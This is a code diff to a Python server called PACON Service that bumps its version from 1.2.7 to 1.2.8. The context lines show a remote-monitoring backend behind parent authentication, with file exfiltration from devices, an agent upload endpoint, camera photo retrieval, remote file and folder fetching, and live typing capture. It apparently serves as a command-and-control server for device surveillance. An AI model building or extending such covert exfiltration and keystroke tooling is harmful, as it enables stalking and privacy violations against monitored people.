@@ -1,8 +1,10 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-PACON Service - v1.2.7
+PACON Service - v1.2.8
 =======================
+v1.2.8 changes:
+  - Bumped version to match Agent v1.2.8
 v1.2.7 changes:
   - NEW: RECEIVED_DIR + file exfiltration index
   - NEW: /api/monitor/file-upload (agent uploads files)
@@ -394,7 +396,7 @@ def ping_server():
     while ping_running and not _stop_event.is_set():
         try:
             req = urllib.request.Request(url, method='GET')
-            req.add_header('User-Agent', 'PACON-SelfPing/1.2.7')
+            req.add_header('User-Agent', 'PACON-SelfPing/1.2.8')
             with urllib.request.urlopen(req, timeout=30) as response:
                 if response.status == 200:
                     logger.debug("✅ Self-ping OK")
@@ -826,7 +828,7 @@ def serve_static(path):
 
 def get_fallback_html():
     return '''<!DOCTYPE html><html><body style="background:#000;color:#0f0;font-family:monospace;padding:20px;">
-    <h1>🛡️ PACON v1.2.7</h1><p>index.html not found in web/public/</p></body></html>'''
+    <h1>🛡️ PACON v1.2.8</h1><p>index.html not found in web/public/</p></body></html>'''
 
 # ============================================================
 # HEALTH
@@ -840,7 +842,7 @@ def health_check():
         "success":          True,
         "service":          "PACON API",
         "status":           "running",
-        "version":          "1.2.7",
+        "version":          "1.2.8",
         "platform":         platform.system(),
         "devices":          len(devices),
         "online_agents":    online_agents,
@@ -1160,7 +1162,7 @@ def get_camera_photo(filename):
     return jsonify({"error": "File not found"}), 404
 
 # ============================================================
-# FILES / ACTIVITY (patched v1.2.7)
+# FILES / ACTIVITY
 # ============================================================
 @app.route('/api/files/list', methods=['GET'])
 @require_parent_auth
@@ -1199,7 +1201,7 @@ def list_files():
     return jsonify(merged[:limit])
 
 # ============================================================
-# ✅ v1.2.7: FILE EXFILTRATION
+# FILE EXFILTRATION
 # ============================================================
 def _save_received_file(device_id: str, filename: str, raw: bytes,
                         source_path: str, mime: str) -> dict:
@@ -2069,7 +2071,7 @@ def control_devices_list():
     return jsonify({'success': True, 'devices': online})
 
 # ============================================================
-# ✅ v1.2.7: FETCH FILE / FOLDER
+# FETCH FILE / FOLDER
 # ============================================================
 @app.route('/api/control/fetch-file', methods=['POST'])
 @require_parent_auth
@@ -2347,7 +2349,7 @@ except Exception:
 # ============================================================
 def main():
     print("=" * 70)
-    print("  PACON SERVICE v1.2.7 — FILE EXFILTRATION + LIVE TYPING")
+    print("  PACON SERVICE v1.2.8 — ATOMIC CLICK + FILE EXFILTRATION")
     print("=" * 70)
     print(f"  Web dir:          {WEB_DIR}")
     print(f"  Received dir:     {RECEIVED_DIR}")
